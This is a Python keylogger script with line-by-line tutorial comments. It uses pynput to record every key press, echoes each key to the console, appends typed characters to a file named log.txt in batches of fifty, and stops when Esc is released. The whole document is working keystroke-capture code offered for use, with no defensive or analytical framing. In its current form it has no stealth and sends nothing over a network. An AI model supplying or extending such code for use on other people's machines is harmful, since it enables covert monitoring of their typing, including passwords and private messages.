import pynput  # Imports the pynput library (must be installed separately)

from pynput.keyboard import Key, Listener
# Imports Key (for special keys like Esc, Space, Enter) and Listener (for monitoring keyboard events).

count = 0  # Creates a counter to keep track of how many keys have been pressed.
keys = []  # Creates an empty list to store the pressed keys

def on_press(key):  # Defines a function that runs whenever a key is pressed.
    global keys, count  # Allows modifying the global variables `keys` and `count`

    keys.append(key)  # Adds the pressed key to the list of keys
    count += 1  # Increments the key press counter by 1
    print("{0} pressed".format(key))  # Prints the pressed key to the console

    if count >= 50:  # If 50 keys have been pressed...
        count = 0  # Resets the counter back to 0
        write_file(keys)  # Calls the function to save the keys to a file
        keys = []  # Clears the list of keys after writing

def write_file(keys):  # Defines a function to write the collected keys to a file
    with open("log.txt", "a") as f:  # Opens (or creates) "log.txt" in append mode
        for key in keys:  # Loops through each key stored in the list
            k = str(key).replace("'", "")  # Converts the key object to a string and removes quotes
            if k.find("space") > 0:  # If the key is spacebar
                f.write('\n')  # Write a newline instead of "space"
            elif k.find("Key") == -1:  # If it’s not a special key (like Esc, Shift, etc.)
                f.write(k)  # Write the character to the file

def on_release(key):  # Defines a function that runs when a key is released.
    if key == Key.esc:  # For if the released key is Escape
        return False    # Stops the listener (ends the program)

# Starts listening for keyboard events.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Keeps the listener running until it is stopped (Esc is pressed)
